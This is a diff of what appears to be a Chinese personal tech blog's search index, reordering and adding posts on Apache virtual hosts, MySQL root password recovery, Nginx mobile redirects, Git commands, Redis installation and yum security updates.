-<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName abcd.com</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error801.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access801.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxc2c4bDBqMzBvczBhN2pzYy5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>访问（<code>http://abcd.com</code>）, 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdTUxdjRqMzBkbTA2ZmdsbC5qcGc?x-oss-process=image/format,png" alt=""></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
-        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -616,6 +503,94 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Ubuntu系统下配置Apache虚拟主机</title>
+    <url>/2018/05/24/21.html</url>
+    <content><![CDATA[<p>Ubuntu系统下安装了Apache服务，想要通过IP、域名、端口访问多个Web应用。</p>
+<a id="more"></a>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
+<p>此教程适合apt-get install apache2安装的apache</p>
+</blockquote>
+<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
+<li><p>进入配置文件目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apache2/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置文件说明</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2.conf  #apache总的配置文件</span><br><span class="line">ports.conf    #端口配置文件</span><br><span class="line">sites-enables/000-default.conf    #虚拟主机配置文件</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="配置多个虚拟主机"><a href="#配置多个虚拟主机" class="headerlink" title="配置多个虚拟主机"></a>配置多个虚拟主机</h2><ol>
+<li><p>使用不同的端口访问网站的不同目录</p>
+<ul>
+<li>新增目录 <code>/var/www/html1</code> ,新增文件<code>/var/www/html1/index.php</code>（index.php文件内容自定）</li>
+<li>修改 <code>ports.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Listen 8006</span><br></pre></td></tr></table></figure>
+效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdDN0MnhqMzBuNzA4cmpydi5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:8006&gt;</span><br><span class="line">        ServerName 192.168.0.109</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error80.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access80.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxcnYycnZqMzBydTBqZDQwcy5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>重启apache2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
+<li>访问 ( IP:8006 ) , 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdGhrcXFqMzBmMzA3Ymdsbi5qcGc?x-oss-process=image/format,png" alt=""></li>
+</ul>
+</li>
+<li><p>使用域名访问网站的不同目录</p>
+<ul>
+<li>修改本地host文件, 自定义一个域名, 指向服务器<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdHRqZ3NqMzBjdzA2N3dlaC5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName abcd.com</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error801.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access801.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxc2c4bDBqMzBvczBhN2pzYy5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>访问（<code>http://abcd.com</code>）, 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdTUxdjRqMzBkbTA2ZmdsbC5qcGc?x-oss-process=image/format,png" alt=""></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>修改MySql数据库密码</title>
+    <url>/2017/09/17/2.html</url>
+    <content><![CDATA[<p>笔者记性不太好，所以忘记密码是常有的事情。这不连数据库的密码也忘了。下面就来介绍一下如何暴力地修改数据库密码。</p>
+<a id="more"></a>
+<ol>
+<li>修改MySql的登录设置，保存退出</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">在[mysqld]的内容段中加入一句</span></span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>重新启动数据库</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>登录并修改MySQL数据库的密码</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">mysql &gt;use mysql;</span><br><span class="line">mysql &gt;update user set Password = password ('123456') where User = 'root';</span><br><span class="line">mysql &gt;exit;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>还原MySql的登录设置</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line">[注释掉原先新增的配置项] skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>重启MySQL并用新密码登录</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考文章：<a href="https://www.cnblogs.com/52php/p/5675258.html" target="_blank" rel="noopener">https://www.cnblogs.com/52php/p/5675258.html</a></p>
+]]></content>
+      <categories>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>数据库</tag>
+        <tag>修改密码</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ThinkPHP5.0模型之基础篇</title>
     <url>/2018/07/05/22.html</url>
     <content><![CDATA[<p>使用ThinkPHP5.0的模型，进行基本的增删改查操作。</p>
@@ -646,6 +621,57 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>ThinkPHP框架</tag>
         <tag>模型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx配置--区分PC和WAP访问不同域名</title>
+    <url>/2018/01/13/18.html</url>
+    <content><![CDATA[<p>考虑到网站在多种设备下的兼容性，有很多网站会有手机版和电脑版两个版本。访问同一个网站URL，当服务器识别出用户使用电脑访问，就打开电脑版的页面，如果使用手机访问，就会得到手机版的页面。</p>
+<a id="more"></a>
+<p>要想让网站适配PC和WAP，首先要能做出准确的判断。HTTP请求的Header中的User-Agent可以区分客户端的浏览器类型，可以通过User-Agen来判断客户端的设备。<br><strong>下面举一个PC链接在WAP访问的例子：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    if ( $http_user_agent ~ "(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)" ) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://m.nsxsg.com/wap/$1 last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^/(.*)$  /index.php/$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>接下来解释一下其中的几个关键点：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;&#125; #匹配所有的请求</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent ~ “(一堆WAP匹配)” <span class="comment">#判断是wap</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent !~ “(一堆WAP匹配)” <span class="comment">#判断不是wap</span></span></span><br><span class="line"></span><br><span class="line">rewrite regex replacement [flag] #rewrite重写，regex正则，replacement替换的内容，flag标志位（详情自行百度这里用last就可以了）</span><br></pre></td></tr></table></figure>
+
+<p>上述内容用一句话概括：</p>
+<blockquote>
+<p>匹配所有请求，如果客户端是wap，重写域名斜杠后面的所有内容为<a href="http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）" target="_blank" rel="noopener">http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）</a></p>
+</blockquote>
+<p>WAP链接在PC访问的具体配置自行修改。</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>NGINX</tag>
+        <tag>配置文件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git使用之开发者</title>
+    <url>/2018/10/18/23.html</url>
+    <content><![CDATA[<p>近年来Git的热度居高不下，本文是笔者对Git的一些常用命令做的记录。</p>
+<a id="more"></a>
+<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"># 初始化本地仓库</span><br><span class="line"></span><br><span class="line">git remote add &lt;remote&gt; &lt;url&gt;</span><br><span class="line"># 添加远程版本库，remote可自行取名，默认origin，url为远程仓库的HTTPS或者SSH地址</span><br><span class="line"></span><br><span class="line">git remote -v</span><br><span class="line"># 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote remove &lt;remote&gt;</span><br><span class="line"># 删除远程remote链接</span><br><span class="line"></span><br><span class="line">git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 下载代码及快速合并 remote为添加的版本库别名，branch可以是dev:master（dev为远端分支，master为本地分支）</span><br></pre></td></tr></table></figure>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjajdkcm5qMzBoMzBhdWdtYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
+<h2 id="代码拉取和推送"><a href="#代码拉取和推送" class="headerlink" title="代码拉取和推送"></a>代码拉取和推送</h2><ul>
+<li><p><strong>每天开发之前需要先拉取一遍远程版本库的代码</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br></pre></td></tr></table></figure>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjam9leWdqMzBmdDA5bHEzZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
+</li>
+<li><p><strong>每天开发完成后进行代码提交（需要再次进行线上的拉取）</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"># 添加所有改动到缓存区</span><br><span class="line"></span><br><span class="line">git commit -m &#39;描述&#39;</span><br><span class="line"># 提交缓存区内的文件，并提供描述</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line"># 查看当前版本状态（是否clean）</span><br><span class="line"></span><br><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br><span class="line"></span><br><span class="line">git push &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 上传代码及快速合并，remote为添加的版本库别名，branch可以是master:dev（master为本地分支，dev为远端分支）</span><br></pre></td></tr></table></figure>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjazl6NW5qMzBnbjBleWFiMy5qcGc?x-oss-process=image/format,png" alt="image"></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+        <tag>版本控制系统</tag>
       </tags>
   </entry>
   <entry>
@@ -680,32 +706,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </categories>
       <tags>
         <tag>Apache</tag>
-        <tag>Git</tag>
-        <tag>版本控制系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git使用之开发者</title>
-    <url>/2018/10/18/23.html</url>
-    <content><![CDATA[<p>近年来Git的热度居高不下，本文是笔者对Git的一些常用命令做的记录。</p>
-<a id="more"></a>
-<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"># 初始化本地仓库</span><br><span class="line"></span><br><span class="line">git remote add &lt;remote&gt; &lt;url&gt;</span><br><span class="line"># 添加远程版本库，remote可自行取名，默认origin，url为远程仓库的HTTPS或者SSH地址</span><br><span class="line"></span><br><span class="line">git remote -v</span><br><span class="line"># 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote remove &lt;remote&gt;</span><br><span class="line"># 删除远程remote链接</span><br><span class="line"></span><br><span class="line">git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 下载代码及快速合并 remote为添加的版本库别名，branch可以是dev:master（dev为远端分支，master为本地分支）</span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjajdkcm5qMzBoMzBhdWdtYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
-<h2 id="代码拉取和推送"><a href="#代码拉取和推送" class="headerlink" title="代码拉取和推送"></a>代码拉取和推送</h2><ul>
-<li><p><strong>每天开发之前需要先拉取一遍远程版本库的代码</strong>  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjam9leWdqMzBmdDA5bHEzZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
-</li>
-<li><p><strong>每天开发完成后进行代码提交（需要再次进行线上的拉取）</strong>  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"># 添加所有改动到缓存区</span><br><span class="line"></span><br><span class="line">git commit -m &#39;描述&#39;</span><br><span class="line"># 提交缓存区内的文件，并提供描述</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line"># 查看当前版本状态（是否clean）</span><br><span class="line"></span><br><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br><span class="line"></span><br><span class="line">git push &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 上传代码及快速合并，remote为添加的版本库别名，branch可以是master:dev（master为本地分支，dev为远端分支）</span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjazl6NW5qMzBnbjBleWFiMy5qcGc?x-oss-process=image/format,png" alt="image"></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
         <tag>Git</tag>
         <tag>版本控制系统</tag>
       </tags>
@@ -758,31 +758,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu下安装Redis</title>
-    <url>/2018/11/01/25.html</url>
-    <content><![CDATA[<p>许多的互联网公司将Redis作为数据库和缓存工具，本文笔者就如何在Ubuntu下安装Redis做一个记录。</p>
-<a id="more"></a>
-<p><strong>1. 安装Redis服务器端</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y redis-server</span><br></pre></td></tr></table></figure>
-<p><strong>2. 查看Redis状态</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/redis-server status</span><br></pre></td></tr></table></figure>
-<p><strong>3. 链接Redis</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
-<p><strong>4. 简单操作</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的key</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置一个key</span></span><br><span class="line">127.0.0.1:6379&gt; set key1 'hello world'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看key</span></span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除key</span></span><br><span class="line">127.0.0.1:6379&gt; del key1</span><br></pre></td></tr></table></figure>
-
-<p><strong>5. 删除Redis</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove -y redis-server</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Redis</tag>
-        <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThinkPHP5.1使用PHPExcel进行数据的导入导出</title>
     <url>/2019/01/18/27.html</url>
     <content><![CDATA[<p>数据的批量导入和导出是一个项目的基本功能，本文笔者介绍一下如何在ThinkPHP框架中使用PHPExcel进行数据的导入和导出。</p>
@@ -832,81 +807,28 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>JavaScript生成随机数</title>
-    <url>/2017/09/17/3.html</url>
-    <content><![CDATA[<p>随机数在Web开发中的运用还是十分广泛的，比如：验证码的生成、密码的生成、抽奖系统等。</p>
+    <title>Ubuntu下安装Redis</title>
+    <url>/2018/11/01/25.html</url>
+    <content><![CDATA[<p>许多的互联网公司将Redis作为数据库和缓存工具，本文笔者就如何在Ubuntu下安装Redis做一个记录。</p>
 <a id="more"></a>
-<ul>
-<li><p>预备知识 <code>Math.random()</code> 函数返回0和1之间的伪随机数，可能为0，但总是小于1。</p>
-</li>
-<li><p>生成 <code>n-m</code> ，包含 <code>n</code> 但不包含 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code> </li>
-<li>第二步：<code>Math.random()*w</code> </li>
-<li>第三步：<code>Math.random()*w+n</code> </li>
-<li>第四步：<code>parseInt(Math.random()*w+n,10)</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 但包含 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n</code></li>
-<li>第四步：<code>Math.floor(Math.random()*w+n)+1</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 和 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n-2</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n+1</code></li>
-<li>第四步：<code>Math.round(Math.random()*w+n+1)</code> 或者 <code>Math.ceil(Math.random()*w+n+1)</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，包含 <code>n</code> 和 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n</code></li>
-<li>第四步：<code>Math.round(Math.random()*w+n)</code> 或者 <code>Math.ceil(Math.random()*w+n)</code></li>
-</ol>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>JavaScript</category>
-      </categories>
-      <tags>
-        <tag>随机数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux软件漏洞修复</title>
-    <url>/2019/09/26/30.html</url>
-    <content><![CDATA[<p>阿里云安全中心提示待处理漏洞，通过搜集资料笔者对漏洞进行了相应的处理，并通过了阿里云的验证。</p>
-<a id="more"></a>
-<h2 id="libssh2-安全更新"><a href="#libssh2-安全更新" class="headerlink" title="libssh2 安全更新"></a>libssh2 安全更新</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
-<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
-<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libssh2</span><br><span class="line">或者</span><br><span class="line">yum update -y libssh2</span><br></pre></td></tr></table></figure></li>
-<li>复查<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa libssh2</span><br></pre></td></tr></table></figure></li>
-<li>去阿里云安全中心验证，通过即可</li>
-</ol>
-<hr>
-<p>参考文章：<a href="https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A" target="_blank" rel="noopener">https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A</a></p>
-<h2 id="curl-安全和BUG修复更新"><a href="#curl-安全和BUG修复更新" class="headerlink" title="curl 安全和BUG修复更新"></a>curl 安全和BUG修复更新</h2><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
-<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
-<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libcurl-devel</span><br><span class="line">yum install -y libcurl</span><br><span class="line">yum install -y curl</span><br><span class="line">或者</span><br><span class="line">yum update -y libcurl-devel</span><br><span class="line">yum update -y libcurl</span><br><span class="line">yum update -y curl</span><br></pre></td></tr></table></figure></li>
-<li>去阿里云安全中心验证，通过即可</li>
-</ol>
-<hr>
-<p>参考文章：<a href="https://www.xuexiareas.com/index/Articles/details/num/315.html" target="_blank" rel="noopener">https://www.xuexiareas.com/index/Articles/details/num/315.html</a></p>
+<p><strong>1. 安装Redis服务器端</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y redis-server</span><br></pre></td></tr></table></figure>
+<p><strong>2. 查看Redis状态</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/redis-server status</span><br></pre></td></tr></table></figure>
+<p><strong>3. 链接Redis</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
+<p><strong>4. 简单操作</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的key</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置一个key</span></span><br><span class="line">127.0.0.1:6379&gt; set key1 'hello world'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看key</span></span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除key</span></span><br><span class="line">127.0.0.1:6379&gt; del key1</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 删除Redis</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove -y redis-server</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>安全防护</tag>
-        <tag>Linux软件漏洞</tag>
+        <tag>Redis</tag>
+        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -952,6 +874,35 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
         <tag>SSRF漏洞</tag>
         <tag>WordPress</tag>
         <tag>安全漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux软件漏洞修复</title>
+    <url>/2019/09/26/30.html</url>
+    <content><![CDATA[<p>阿里云安全中心提示待处理漏洞，通过搜集资料笔者对漏洞进行了相应的处理，并通过了阿里云的验证。</p>
+<a id="more"></a>
+<h2 id="libssh2-安全更新"><a href="#libssh2-安全更新" class="headerlink" title="libssh2 安全更新"></a>libssh2 安全更新</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
+<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
+<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libssh2</span><br><span class="line">或者</span><br><span class="line">yum update -y libssh2</span><br></pre></td></tr></table></figure></li>
